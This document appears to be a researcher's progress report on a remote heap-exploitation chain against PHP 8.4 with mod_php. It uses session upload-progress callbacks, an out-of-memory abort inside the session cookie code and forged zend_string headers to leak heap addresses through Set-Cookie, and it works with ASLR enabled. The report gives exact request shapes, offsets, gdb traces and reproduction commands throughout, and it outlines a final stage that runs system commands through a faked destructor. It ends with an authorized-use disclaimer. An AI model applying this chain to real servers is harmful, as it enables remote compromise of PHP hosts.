# Pure HTTP chain without relying on `display_errors`: progress and remaining calibration

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (`172.16.0.103`,
`display_errors=0`, `memory_limit=8M`, single worker)
Constraints: fully remote, sending only ordinary multipart HTTP; the target page is
`<?php echo "OK\n"; ?>` (no `session_start()`); no reading of the target's `/proc`.

---

## 1. Conclusion (current status)

Under `display_errors=0` we have now achieved the **OOM-in-cookie primitive that does not depend on warning output**:

1. Request A OOMs inside `php_session_send_cookie()`, at the first
   `zend_string_safe_alloc(3, 32, 0, 0)` of `php_url_encode()` (121B → bin 128);
2. The OOM occurs after `PS(send_cookie)=1` and before `PS(send_cookie)=0`;
   the request bails out, leaving `PS(id)` (a 32-character random id) and `PS(send_cookie)=1` behind;
3. No PHP warning or output is involved; `SG(headers_sent)` remains 0 throughout;
4. In the subsequent request B, the pre-RINIT `MULTIPART_EVENT_END → php_session_rfc1867_cleanup()
   → php_session_initialize()` can now get through the cleanup of the `PS(mod_data)` left by A,
   and calls `php_session_send_cookie()` with the **dangling `PS(id)`** (the `RESET_ID`/`SEND_COOKIE`
   breakpoints have been hit in practice, `send_cookie=1`).

The remaining step is for B to reoccupy the dangling id block with a forged `zend_string` header (so that `url_encode` reads a controlled large length), while also making `php_rshutdown_session_globals()` release that id without triggering `zend_mm_panic`. **This step is also complete**: B uses two large fields to lay out the cached id chunk through page 510, so that the second field's live copy lands exactly on pages 257–511, and writes the forged header plus the trailing uninitialized region at the corresponding offset in page 511; `url_encode` reads out 4000 bytes, of which the last 3000 bytes are the bin-64 freelist pointers left by A at the tail of page 511.

Measured (`display_errors=0`):

```text
Set-Cookie: PHPSESSID=MMMM... (1000 bytes of M, followed by the 4000-byte decoded result)
decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000     # no-ASLR
decoded=4000 ptrs=47 chunk_base=0x7f9acd000000     # ASLR-on
decoded=4000 ptrs=47 chunk_base=0x7f1416e00000     # ASLR-on
```

No-ASLR 3/3, ASLR enabled 2/2 (all under a configuration confirmed to use `display_errors 0`); the failure samples merely miss page 511 (returning a normal 32-byte cookie) and do not crash.

### 1.1 The target page does not need `session_start`

The target page for this round of testing is:

```php
<?php echo "OK\n"; ?>
```

There is no `session_start()`. The entire chain still holds because session initialization happens in the `session.upload_progress` callback before RINIT:

- A: `MULTIPART_EVENT_FILE_START → php_session_rfc1867_update →
  php_session_initialize()`;
- B: `MULTIPART_EVENT_END → php_session_rfc1867_cleanup →
  php_session_initialize()`.

Both occur before script execution, so whether the page calls `session_start()` is irrelevant to the exploit chain. Measured (same session-less page):

- forge leak with `display_errors=0`: 4000 bytes / 47 pointers, chunk base
  `0x7ffff3e00000` (evidence `logs/nosession_forge_20261021.resp`);
- old `display_errors=1` stage 1 leak: 4096 bytes / 98 pointers, chunk base
  `0x7ffff5e00000` (evidence `logs/nosession_classic_leak_20261021.resp`).


---

## 2. Why the old chain depended on `display_errors`

The old A used a `max_input_vars` warning to set `SG(headers_sent)` to 1, causing `php_session_send_cookie()` to return `FAILURE`:

```c
if (SG(headers_sent)) { ... return FAILURE; }   /* send_cookie still 1 */
```

`php_session_reset_id()` returns `FAILURE` → `php_session_initialize()` calls `php_session_abort()` → `ps_close_files()` releases `PS(mod_data)` normally (setting it to NULL). B's `s_open` then sees `mod_data == NULL` and never touches the dangling pointer; B only needs to reoccupy the dangling id block with a raw buffer.

With `display_errors=0` the warning produces no output, `headers_sent` is never set, and this "FAILURE + abort" path disappears. The only option is to make the OOM happen directly inside `send_cookie`:

- `send_cookie` never returns, so `PS(send_cookie)=1` is retained;
- but `php_session_abort()` also never runs, so `PS(mod_data)` becomes a dangling pointer;
- B's `s_open` will first call `ps_close_files(dangling mod_data)`, which is the new problem.

---

## 3. A: allocation facts for the OOM-in-cookie

The first allocation in `php_session_send_cookie()` (8.4.26):

```c
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

`php_url_encode_impl()`:

```c
start = zend_string_safe_alloc(3, len, 0, 0);   // len = 32
```

Request size = `24 + 3*32 + 1 = 121` → **bin 128** (one-page run, 32 slots).
It is enough to satisfy both of the following at the `send_cookie` entry:

- `heap->free_slot[11] == NULL` (bin 128 empty)
- the sum of `free_pages` across the four chunks is 0

Then this allocation goes `zend_mm_alloc_small_slow(heap, 11)` →
`zend_mm_alloc_pages(1)` → no free page → `zend_mm_safe_error` → bailout.

### 3.1 Request shape

`tools/send_a_oom5.py`, measured stable parameters:

```text
F=0  S=62  NB=235  BL=15000  X=208  K=0  KL=4000  FL=103
```

- **S=62 single-name fields**: name 103B (zend_string = 128 → bin 128), value 8B.
  Each field's filter value copy is bin 40; the name contributes one live bin-128 block.
  The file part (field name 103B + filename 103B) contributes another two live bin-128 blocks.
  Total `62 + 2 = 64 = 2×32` → `free_slot[11]` is exactly empty.
  (Note: a field with a 103B value would contribute three live bin-128 blocks, so an 8B value must be used here.)
- **NB×BL = 235 × 15000B**: large fields fill memory; each value has two live copies
  (`IF_G(post_array)` + `$_POST`), each one `25+15000` → 4 pages, 8 pages per field.
- **X=208 values of 231B**: bin 256 (16 slots/page); each field has 2 live slots + 1 transient
  raw slot; every 8 fields triggers a new 256B run (1 page), used for one-page-granularity finishing.

### 3.2 gdb evidence

`logs/oomcookie_A_20261021.log`:

```text
SEND_COOKIE id=0x7ffff3fff000 len=32 size=8253840 real=8388608 limit=8388608
            free_pages=0 chunks=[0,0,0,0] fs7=.../63 fs9=0/0 fs11=0x0/0
MM_SAFE_ERROR real=8388608 limit=8388608 size=8253968
PS_AT_OOM id=0x7ffff3fff000 len=32 send_cookie=1
#3 zend_string_safe_alloc (persistent=false, l=0, m=32, n=3)
#4 php_url_encode_impl (raw=false, len=32, s=0x7ffff3fff018 "...")
#5 php_url_encode
#6 php_session_send_cookie
#7 php_session_reset_id
#8 php_session_initialize
#9 php_session_rfc1867_update
```

Key points:

- `real=8M=limit`: all four chunks are mapped; no further mmap is possible;
- `free_pages=0`, `fs11=0`: there is nowhere for `url_encode`'s bin-128 run to go;
- the OOM lands precisely in `php_url_encode_impl`, not in the parsing/large-field phase;
- `PS_AT_OOM send_cookie=1`: `PS(send_cookie)` was not cleared to 0, and `PS(id)` still points to
  the 32-character random id (`id=0x7ffff3fff000`, located in page 511 of chunk `0x7ffff3e00000`).

A's response is `500 Internal Server Error` with an empty body (`display_errors=0` produces no output); the worker survives.

### 3.3 Calibration method

`tools/trial_bins.sh` restarts Apache each time (`setarch -R`), attaches gdb, sends A, and prints `SEND_COOKIE` / `MM_SAFE_ERROR`. Adjusting X (±1) moves `free_pages` between 0 and non-zero; `fs11` is determined solely by S (S ≡ 30 mod 32). With the current S=62, X=206..212 all hit `free_pages=0, fs11=0`.

---

## 4. B: getting past the dangling `PS(mod_data)`

### 4.1 Crash mechanism

B's `MULTIPART_EVENT_END → php_session_rfc1867_cleanup() →
php_session_initialize()`:

```c
PS(mod)->s_open(&PS(mod_data), ...)          /* ps_open_files */
    data = ecalloc(1, sizeof(ps_files));     /* 40B -> bin 40 */
    data->basedir = zend_string_init("/tmp");
    if (PS_GET_MOD_DATA()) ps_close_files(mod_data);   /* <- dangling pointer */
    PS_SET_MOD_DATA(data);
```

A's `PS(mod_data)` is a `ps_files*` (`ecalloc(1,40)`); the measured address is `0x7ffff5e7f500` (main chunk + `0x7f500`, bin-40 slot 32). A's shutdown did not run the session RSHUTDOWN, so this pointer is left dangling.

If that address is not a valid block in B, `efree(data)` inside `ps_close_files()` triggers `zend_mm_panic("zend_mm_heap corrupted")` (the `chunk->heap` check).

### 4.2 Solution: turn that page into an arbitrary SRUN page in B

`zend_mm_free_heap()` performs **no block-alignment check** on SRUN pages; it only checks `chunk->heap == heap`, after which `zend_mm_free_small(heap, ptr, bin)` pushes the block straight onto the freelist. Therefore, as long as B turns the page containing `0x7ffff5e7f500` (main chunk page 127) into a run page for a small bin, `efree(data)` will not panic.

Measured B shape:

```text
N=160 fields, value length 231B (bin 256)
```

At B's `ps_open_files` breakpoint:

```text
new=0x7ffff5e64028 pg=100 info=0x80000004
old=0x7ffff5e7f500 pg=127 chunk_heap=0x7ffff5e00040 match=1 info=0x8000000f
last_key=0x7ffff5e7f600 basedir=0x7ffff5e022c0 fd=-1
```

- page 127 is SRUN bin 15 (256B); slot 5 is unallocated (the run still has 12 free slots);
- `last_key` is the pointer to the next free slot in the same run (safe);
- `basedir` is still A's `/tmp` zend_string pointer (safe; bin-32 page, SRUN);
- `fd=-1`.

`ps_close_files` therefore returns, and `s_open` installs a brand-new valid `mod_data`; initialize sees that the first byte of the dangling id is non-zero (A's random id is still intact), skips create-id, and goes straight to `php_session_reset_id()`:

```text
RESET_ID id=0x7ffff3fff000 len=32 send_cookie=1
SEND_COOKIE id=0x7ffff3fff000 len=32 ... free_pages=370 ...
```

**B has now called `php_session_send_cookie()` with the dangling id** (because A's id is still there and `send_cookie=1` is still set). This step is the replacement for the `display_errors` dependency in the old chain.

### 4.3 Remaining crash: rshutdown releasing the dangling id

`MULTIPART_EVENT_END` unconditionally executes after cleanup:

```c
php_rshutdown_session_globals();
    ...
    if (PS(id)) { zend_string_release_ex(PS(id), 0); PS(id) = NULL; }
```

The dangling id lives in page 511 of chunk `0x7ffff3e00000` (start of page, address
`0x7ffff3fff000`). In B that chunk is merely a **cached chunk**:

```text
RSHUT_ID id=0x7ffff3fff000 base=0x7ffff3e00000 pg=511
          chunk_heap=0x0 match=0 info=0x0
          bytes=01000000160000000000000000000000   # refcount=1
```

`chunk_heap=0` → the `chunk->heap == heap` check in `zend_mm_free_heap` fails → panic. A's id zend_string still has `refcount=1`, so release attempts to efree it.

---

## 5. B's forge (implemented)

### 5.1 Goal

Make B reoccupy the dangling id block with controlled content before `send_cookie`
(`0x7ffff3e00000 + 0x1ff000`, i.e. slot 0 of page 511 in that chunk), such that:

- `PS(id)+0x10` (len) = 4000;
- `PS(id)+0x00` is not refcount=1 at rshutdown (after free it is the freelist next);
- `url_encode` reads 4000 bytes starting at `PS(id)+0x18`, the first 1000 bytes being filler and the last 3000
  bytes being the bin-64 freelist pointers left by A at the tail of page 511;
- `url_encode`'s `3*len` allocation (12000B → 3 pages) succeeds in B.

### 5.2 Laying out pages with two fields

B's body order (`send_b_open.py`):

```text
160 × 231B values (bin-256 run, turning main chunk page 127 into a partial run with 12 free slots)
1 × 1,048,551B value (BB1, zend_string = 256 pages)
1 × 1,041,384B value (BF, zend_string = 255 pages, forged payload)
PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
(no file part; uses pre-RINIT END cleanup)
```

Allocation sequence (measured):

1. BB1's raw buffer (256 pages) first lands in the free tail of the main chunk, then is freed;
2. One of BB1's two live copies takes the cached id chunk out (`chunk_init`),
   landing on pages 1–256;
3. BF's raw buffer (255 pages) reuses the free tail of the main chunk, then is freed;
4. BF's live copy lands on pages 257–511 of the id chunk (since 257–511 is exactly 255 pages,
   an exact Best-Fit match), and page 511 is overwritten.

Thus `PS(id)` (page 511) lands inside the **data region of a live zend_string**, and that data will not be overwritten by later allocations.

### 5.3 Forged header layout

BF's allocation starts at `S = chunk + 257*4096`; page 511 is at `S + 254*4096`.
The zend_string data starts at `S+0x18`, so the forged header's offsets within the value are:

```text
D = (510 - 256) * 4096 = 254 * 4096 = 1,040,384
gc    at D-24 : 0x4141414141414141   (refcount != 1 at rshutdown)
h     at D-16 : 0
len   at D-8  : 4000
data  at D    : 'M' * 1000, after which the value ends (L2 = D+1000)
```

BF's allocation size `25 + L2 = 1,041,409` → 255 pages (exactly aligned with pages 257–511).
The value data is written only up to 1000 bytes inside page 511; the following ~3000 bytes are uninitialized,
retaining the bin-64 freelist pointers at the tail of page 511 from A's era.

### 5.4 Measured result

`SEND_COOKIE id=0x7ffff3fff000 len=4000`; `RSHUT_ID ... bytes=41414141...`
(match=1, no further panic); response `200 OK`, and the `Set-Cookie` decodes to 4000 bytes:

```text
logs/oomcookie_leak_noaslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000

logs/oomcookie_leak_aslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7f9acd000000
  (another ASLR round: 0x7f1416e00000)
```

All 47 pointers are addresses inside the chunk (e.g. `0x7ffff3fff400/…f480/…f4c0`);
taking the mode of the 2MB-aligned values gives the chunk base.

### 5.5 Reproduction

```bash
# no-ASLR
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

### 5.6 Stability

- no-ASLR 3/3; ASLR-on 2/2 (both under display_errors=0);
- failure samples: page 511 is not overwritten, `len` remains 32, a normal 32-byte cookie is returned,
  and there is no crash; just retry;
- depends on `trial_ab.sh`'s fresh-worker + gdb attach checks (retry while the breakpoint is pending).

### 5.7 Verified checklist

- [x] Under `display_errors=0`, A OOMs in `php_url_encode`, `send_cookie=1`
- [x] A's `PS(id)` is dangling and persists across requests
- [x] B's `ps_close_files(dangling mod_data)` does not panic (SRUN page + free-slot alignment)
- [x] B calls `send_cookie` with the dangling id (`RESET_ID`/`SEND_COOKIE` hit)
- [x] B takes the cached chunk (`chunk_heap != 0`), rshutdown no longer panics
- [x] Two fields lay out the pages + the BF copy overwrites page 511, forged len=4000
- [x] `Set-Cookie` contains 47 in-chunk pointers, chunk base recoverable (including under ASLR)

## 6. Remaining engineering (stage-2/3)

### 6.1 Exact constraints for stage-2 (display_errors=0)

stage-2 needs to read a real HashTable:

```text
PS(id)+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
PS(id)+0x18 = HT+0x28 = nNextFreeElement                -> first qword of data
PS(id)+0x20 = HT+0x30 = pDestructor (libphp+0x613c50)    -> second qword of data
```

Therefore either `PS(id) = HT+0x10`, or the page-511 forge is used to enlarge len so that the read window covers the real HashTable behind it.

With the current 0 chain, `PS(id)` is the **last page** of the cached id chunk (page 511,
`chunk+0x1ff000`). The read window runs from `PS(id)+0x18` to the end of the page, at most about 0xFE8 bytes,
and **cannot go past this chunk** (the addresses beyond are unmapped). So:

1. the real HashTable must fall inside page 511;
2. page 511 can host only **one bin's run**: either bin-56 (the HashTable
   struct, 56B) or the large object carrying the forge — the two cannot coexist;
3. if page 511 becomes a bin-56 run: slot 0 holds a freed 55B raw buffer
   (+0x10 = forged len, +0x18 = data), slot 1 holds the real HashTable
   (pDestructor at page+0x68), and the read window just covers it;
4. but this 1-page run only lands on page 511 of the id chunk when **the main chunk has no free pages**;
   currently B's main chunk still has 370 free pages, so a 1-page run preferentially lands in the main chunk.

### 6.2 Experiments already done

- **Late large field**: insert a 50/100-page field before the X trimmer, and after its raw buffer is freed, try to leave a hole in the main chunk. Measured: with NB=235 it OOMs directly; with NB=215/208 it reaches `send_cookie`, but the id is still in the 0x3e/0x3d chunk and `url_encode` still does not land at the OOM point (`free_pages > 0`). The reason is that the raw buffer's two live copies push steady-state memory to the limit, and the pages freed from the raw buffer are not enough to become the only last page.
- **arData's 513th expansion**: pushing the 513th insert to the end of X OOMs (it needs
  10 contiguous pages); pushing it into the middle of the bigs causes the 4-page hole from the old arData to be consumed exactly by the 4-page copy of the subsequent big value.
- **Conclusion**: completing stage-2 requires explicit three-stage heap shaping — "fill the main chunk with live copies + leave page 511 free in the id chunk + land a bin-56 run on 511"; this is the next calibration task and cannot be solved by tuning a single parameter.

### 6.3 New primitive (evening of 2026-10-21): shifting the stale id inside a live string

The 5.x path above leaves `PS(id)` on page 511 of the cached chunk; this round takes a different path that is **inside the main chunk and does not depend on the page-511 forge**, and has already produced a measured 16KB out-of-bounds read:

1. On top of `WARM_LEN=60`, A adds one more field with a 32-byte value (`W64_LEN=32`,
   stored zend_string = 24+32+1 = 57 → bin-64). It first takes slot 0 of the bin-64 run on page
   128, and `php_session_create_id`'s 32-byte id lands in **slot 1**:
   `PS(id) = chunk + 0x80080` (page 128 + 0x80).
2. B still uses N=160 fields with 231B values; page 128 is a bin-256 run and slot 0 is a
   **live** 231B string. `PS(id)=page+0x80` falls exactly inside that string's data region:
   - the id's len field is at `PS(id)+0x10 = page+0x90 = value[0x78]`;
   - the id's data starts at `PS(id)+0x18 = page+0x98 = value[0x80]`.
   Writing `0x4000` at offset 0x78 and a non-zero byte (`V`) at offset 0x80 of **every** value
   string makes B's `send_cookie` URL-encode 0x4000 bytes:
   the header check (`ZSTR_VAL(id)[0] != 0`) also passes, because that byte is the `V` we wrote.
3. No freelist/forge landing on the stale block is needed any more, nor is a cached chunk.

Measured parameters and results (no-ASLR, display_errors=0):

```bash
# A: WARM=60 moves the id into the main chunk; W64=32 pushes the id from page+0x00 to page+0x80
WARM_LEN=60 W64_LEN=32 ./trial_bins.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT/RESET_ID/SEND_COOKIE id=0x7ffff5e80080 len=32
#   MM_SAFE_ERROR still in php_url_encode; PS_AT_OOM send_cookie=1

# B: N=160 values of 231B, forged len=0x4000 at offset 0x78 inside the value
WARM_LEN=60 W64_LEN=32 BN=160 BVL=231 BVAL_OFF=0x78 BVAL_LEN=0x4000 \
  ./trial_ab.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT id=0x7ffff5e80080 len=16384 send_cookie=1
#   SEND_COOKIE  id=0x7ffff5e80080 len=16384
#   Set-Cookie PHPSESSID=... (20616 characters, decodes to 16392 bytes)
```

Response archived at `logs/oomcookie_shift_leak_20261021.resp`. The decoded 16KB is the bin-256 string slots starting at page 128 (each `gc=0x…0001, h=0, len=0xe7, data='V'*231`), i.e. **a heap read with a controlled length across slots/blocks** is now established; the window contents are currently all field strings themselves, with no libphp code pointers yet.

### 6.4 Two unresolved constraints for stage-2 under the new primitive

Turning the 16KB window into a libphp leak requires a **real HashTable structure** to appear in the window (`pDestructor = libphp+0x613c50` at `HT+0x30`). The alignment is:

```text
PS(id) = HT + 0x10
  id+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
  id+0x18 = HT+0x28 = nNextFreeElement                -> data[0]
  id+0x20 = HT+0x30 = pDestructor                     -> data[8]
```

Currently A's `PS(id)=page128+0x80` is exactly **slot 2 + 0x10** of a bin-56 run (bin-56 slot stride 0x38, slot2=0x70), so as long as B's bin-56 run lands on page 128 and slot 2 is an array HashTable with `nTableSize>=16`, `pDestructor` can be leaked directly. Two blockers measured:

1. **Start of the bin-56 free-list**: at B's `SESSION_INIT`, the bin-6
   (56B) free chain is **64** long (a whole empty page, from A's request
   shutdown). Those 64 slots must be consumed first, and only the 65th HashTable creates a new run;
   but the array fields' key/value strings (bin-32/40/48) build their own
   runs first, stealing page 128 (measured: page 128 becomes bin-3/bin-4 and the id reads
   garbage/len=1).
2. **The stale `ps_files` on page 127**: with display_errors=0, A OOMs inside
   `php_url_encode`, `php_session_abort()` does not run, and `PS(mod_data)`
   remains a dangling ps_files (page 127 + 0x500). B's END cleanup calls
   `ps_close_files` first and then `send_cookie`. Page 127 must be reallocated by B as
   an SRUN page of a **suitable bin**, and the `+0x500` slot must not be a live string (otherwise
   `last_key/basedir` read a zend_string header and `zend_string_release` crashes).
   The 5.x N=160 shape happens to make page 127 bin-256 with slot 5 free;
   adding array/tail fields turns page 127 into free/bin-32/bin-40, triggering
   `zend_mm_panic` or SIGSEGV. No field sequence has yet been found that satisfies both
   "page 127 slot5 safe + page 128 bin-56 run slot2 is a HashTable".

These two points are pure calibration issues for stage-2; the stage-3 `zif_system` terminal
(`pDestructor=zif_system`, fake execute_data) can reuse `send_b_zif.py` directly once stage-2 provides the
libphp base, with only the fake HT/fake-ref addresses re-calibrated for the new shape.

### 6.5 stage-3

The `zif_system` terminal (`pDestructor=zif_system`, fake execute_data) does not depend on
libc; once stage-2 provides the libphp base, the payload from `send_b_zif.py` can be reused directly,
needing only that the fake HT address and fake-ref landing site be re-calibrated for the 0 chain's A/B shapes.


## 7. Files and commands

| File | Purpose |
|---|---|
| `tools/send_a_oom5.py` | A: S fields with 103B names/8B values + NB large fields + X 231B values + file part; optional `AQ_N/AQ_LEN` GET padding, `WARM_LEN`, `W64_LEN` (bin-64 shift) |
| `tools/send_b_open.py` | B: N 231B values + PHPSESSID + PROGRESS, no file part; `BB1_LEN` page layout, `BF_P1/BF_READ` forge, `BVAL_OFF/BVAL_LEN` in-value forged len, `BUNIQ/DUP_*` unique values/duplicate-name fields, `NEST_*` nested arrays, `TAIL231/232` tail fields; optional Cookie/Header/GET padding |
| `tools/trial_bins.sh` | A-only calibration (restart + gdb + send A) |
| `tools/trial_ab.sh` | fresh worker + gdb breakpoint resolution, then send A/B; with `ASLR_ON=1`, does not enable `setarch -R` |
| `tools/g_bins.gdb` | gdb probes: `SEND_COOKIE`, `OPEN_FILES`, `RESET_ID`, `RSHUT_ID`, `MM_SAFE_ERROR`, chunk/page map, cached chunks, bin15 free-slot stats |
| `logs/oomcookie_A_20261021.log` | A's gdb evidence (exact OOM landing site) |
| `logs/oomcookie_AB_20261021.log` | A+B evidence (getting past mod_data, B's send_cookie, old-shape rshutdown panic) |
| `logs/oomcookie_forge_aslr_20261021.gdb.log` | gdb trace of a successful forge (len=4000, RSHUT bytes=4141…) |
| `logs/oomcookie_leak_noaslr_20261021.resp` | no-ASLR leak response (decoded 4000, 47 ptrs, base 0x7ffff3e00000) |
| `logs/oomcookie_leak_aslr_20261021.resp` | ASLR leak response (base 0x7f9acd000000) |
| `logs/oomcookie_leak_decode_20261021.txt` | decoded result summary |
| `logs/oomcookie_shift_leak_20261021.resp` | 16KB leak response for the shifted-id primitive (len=16384, 20616 characters) |

Reproduction (target machine `~/php2shell-work`):

```bash
# A-only: confirm the OOM-in-cookie
./trial_bins.sh 0 62 235 15000 208 0 4000 103

# A + B (getting past mod_data, page 511 not yet overwritten)
BN=160 BVL=231 ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# A + B forge (chunk leak)
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

Key gdb output should include:

```text
SEND_COOKIE id=0x... len=32 free_pages=0 fs11=0x0/0
MM_SAFE_ERROR ... zend_string_safe_alloc(l=0, m=32, n=3) <- php_url_encode
PS_AT_OOM ... send_cookie=1
SESSION_INIT (B) id=0x7ffff3fff000 len=32 send_cookie=1
OPEN_FILES old=... info=0x8000000f last_key=... basedir=... fd=-1
RESET_ID id=0x7ffff3fff000 send_cookie=1
SEND_COOKIE (B) id=0x7ffff3fff000 len=4000
RSHUT_ID ... bytes=4141414141414141... match=1
```

---

## 8. Disclaimer

Intended solely for vulnerability research and reproduction in authorized environments. The request shapes, bin sequences, and offsets are tied to this lab's
PHP 8.4.26 build, 8M memory_limit, files save handler, and single-worker prefork;
changing the build/configuration requires re-calibration.
